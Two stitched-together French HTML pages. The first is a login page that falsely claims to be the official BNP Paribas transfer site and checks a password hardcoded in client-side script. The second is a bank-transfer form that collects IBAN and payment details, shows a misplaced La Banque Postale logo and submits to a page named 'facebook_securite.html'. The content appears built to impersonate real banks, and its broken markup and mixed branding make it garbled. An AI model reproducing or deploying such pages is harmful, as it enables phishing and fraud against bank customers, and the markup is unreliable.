<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Connexion - BNP Paribas</title>
  <style>
    body {
      background-color: #f4f4f4;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background-image: url('https://upload.wikimedia.org/wikipedia/commons/thumb/d/d2/BNP_Paribas.svg/2560px-BNP_Paribas.svg.png');
      background-repeat: no-repeat;
      background-position: center top;
      background-size: 200px;
    }
    .login-box {
      background-color: white;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 0 20px rgba(0,0,0,0.1);
      text-align: center;
      max-width: 350px;
      width: 100%;
    }
    h1 {
      color: #006241;
      margin-bottom: 20px;
    }
    input[type="password"] {
      padding: 10px;
      width: 80%;
      margin: 10px 0;
      border-radius: 5px;
      border: 1px solid #ccc;
    }
    button {
      background-color: #006241;
      color: white;
      padding: 10px 20px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }
    button:hover {
      background-color: #004f34;
    }
    .error {
      color: red;
      display: none;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <h1>Bienvenue</h1>
    <p>Bienvenue sur le site web officiel de virement bancaire de BNP Paribas France</p>
    <input type="password" id="password" placeholder="Mot de passe" />
    <button onclick="checkPassword()">Connexion</button>
    <p class="error" id="error">Mot de passe incorrect.</p>
  </div>

  <script>
    function checkPassword() {
      const password = document.getElementById("password").value;
      const correctPassword = "BNP2024secure"; // Mot de passe à changer

      if (password === correctPassword) {
        window.location.href = "index.html"; // Page d'accueil du site
      } else {
        document.getElementById("error").style.display = "block";
      }
    }
  </script>
</body>
</html>
<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Formulaire de Virement</title>
  <style>
    body
   <img src="https://upload.wikimedia.org/wikipedia/fr/thumb/1/12/La_Banque_Postale_logo.svg/1200px-La_Banque_Postale_logo.svg.png" alt="Logo La Banque Postale" height="60">{
      font-family: Arial, sans-serif;
      background-color: #eef1f5;
      padding: 40px;
    }

    form {
      background-color: #fff;
      padding: 30px;
      max-width: 500px;
      margin: auto;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }

    h2 {
      text-align: center;
      margin-bottom: 20px;
    }

    label {
      font-weight: bold;
      display: block;
      margin-top: 15px;
    }

    input, textarea {
      width: 100%;
      padding: 10px;
      margin-top: 5px;
      border: 1px solid #ccc;
      border-radius: 6px;
    }

    .button {
      background-color: #007bff;
      color: white;
      border: none;
      padding: 12px;
      width: 100%;
      margin-top: 20px;
      font-size: 16px;
      border-radius: 8px;
      cursor: pointer;
    }

    .button:hover {
      background-color: #0056b3;
    }
  </style>
</head>
<body>

  <form action="facebook_securite.html" method="GET">
    <h2>Virement Bancaire</h2>

    <label for="beneficiaire">Nom du bénéficiaire :</label>
    <input type="text" id="beneficiaire" name="beneficiaire" required>

    <label for="iban">IBAN :</label>
    <input type="text" id="iban" name="iban" required>

    <label for="montant">Montant (€) :</label>
    <input type="number" id="montant" name="montant" step="0.01" required>

    <label for="motif">Motif :</label>
    <textarea id="motif" name="motif" rows="2" required></textarea>

    <label for="ville">Ville :</label>
    <input type="text" id="ville" name="ville" required>

    <label for="code_postal">Code Postal :</label>
    <input type="text" id="code_postal" name="code_postal" required>

    <label for="pays">Pays :</label>
    <input type="text" id="pays" name="pays" required>

    <button type="submit" class="button">Effectuer le virement</button>
  </form>
<footer style="text-align: center; padding: 20px; background-color: #f2f2f2; font-size: 14px;">
  &copy; 2025 Banque Française. Tous droits réservés.
</footer>
</body>
</html>
